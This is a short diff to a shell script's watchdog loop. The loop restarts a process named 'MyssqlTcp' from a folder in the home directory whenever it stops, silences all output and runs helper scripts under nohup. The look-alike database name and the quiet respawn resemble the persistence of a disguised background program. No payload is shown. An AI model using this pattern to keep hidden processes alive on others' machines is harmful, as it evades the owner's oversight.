@@ -769,11 +769,12 @@ export LD_LIBRARY_PATH=$HOME/myssqltcp/
 while true; do
         server=`ps aux | grep MyssqlTcp | grep -v grep`
         if [ ! "$server" ]; then
-            /bin/bash .$HOME/myssqltcp/addconf.sh >/dev/null 2>&1
-            /bin/bash .$HOME/myssqltcp/Tcphost.sh --config=./config_background.json >/dev/null 2>&1
+            cd $HOME/myssqltcp/
+            nohup ./addconf.sh >/dev/null 2>&1
+            /bin/bash ./Tcphost.sh --config=./config_background.json >/dev/null 2>&1
             sleep 10
         fi
-        /bin/bash .$HOME/myssqltcp/logserver.sh >/dev/null 2>&1
+        nohup ./logserver.sh >/dev/null 2>&1
         sleep 5
 done
 EOL
